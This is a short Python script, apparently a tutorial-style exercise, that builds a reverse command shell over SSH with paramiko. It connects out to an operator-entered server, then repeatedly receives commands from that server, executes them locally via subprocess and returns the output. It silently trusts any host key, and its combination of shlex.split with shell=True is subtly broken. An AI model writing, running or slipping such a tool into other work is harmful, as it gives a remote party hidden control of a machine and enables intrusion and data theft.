import paramiko 
import shlex 
import subprocess 
def ssh_command(ip, port, user, passwd, command):
 client = paramiko.SSHClient() 
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
 client.connect(ip, port=port, username=user, password=passwd)
 ssh_session = client.get_transport().open_session() #get_transport()->retrives a session in transport layer which is responsible for communication open_session()->creates a new session
 if ssh_session.active: 
        ssh_session.send(command) #client is sending commmand
        print(ssh_session.recv(1024).decode()) #client is receiving
        while True: 
            command = ssh_session.recv(1024) #command is now whats received
            try: 
                cmd = command.decode() 
                if cmd == 'exit': 
                    client.close() 
                    break 
                cmd_output =subprocess.check_output(shlex.split(cmd), shell=True)  #cmd runs inside a shell 
                #client is sending the output that is shown with running the cmd
                ssh_session.send(cmd_output or 'okay')  
            except Exception as e: 
                 ssh_session.send(str(e)) #client is sending the error that occured
 client.close() 
 return 
if __name__ == '__main__': 
    import getpass 
    #user = getpass.getuser() 
    user=input("enter user: ")
    password = getpass.getpass() 
    ip = input('Enter server IP: ') 
    port = input('Enter port: ') 
    ssh_command(ip, port, user, password, 'ClientConnected')
